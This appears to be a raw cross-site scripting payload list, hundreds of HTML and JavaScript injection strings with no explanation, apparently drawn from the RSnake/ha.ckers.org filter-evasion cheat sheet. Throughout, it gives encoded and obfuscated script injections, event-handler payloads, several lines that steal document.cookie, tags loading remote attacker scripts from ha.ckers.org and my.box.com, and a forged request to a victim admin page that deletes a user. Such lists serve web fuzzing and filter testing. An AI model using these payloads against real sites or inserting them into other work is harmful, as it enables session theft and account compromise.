<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
<BODY ONLOAD=alert(‘XSS’)>
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’)”
<iframe src=http://ha.ckers.org/scriptlet.html <
javascript:alert("hellox worldss")
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert("XSS");</script>&search=1
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
<h1><font color=blue>hellox worldss</h1>
<BODY ONLOAD=alert('hellox worldss')>
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<div style="font-family:'foo&#10;;color:red;';">LOL
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
žscriptualert(EXSSE)ž/scriptu
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;!&#91;endif&#93;--&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
'';!--\"&lt;XSS&gt;=&{()}
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>

<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
“><ScRiPt>alert(document.cookie)</script>
“><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
‘; alert(document.cookie); var foo=’
foo\’; alert(document.cookie);//’;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(’XSS’)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
<script/src=data:,alert()>
<marquee/onstart=alert()>
<video/poster/onerror=alert()>
<isindex/autofocus/onfocus=alert()>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
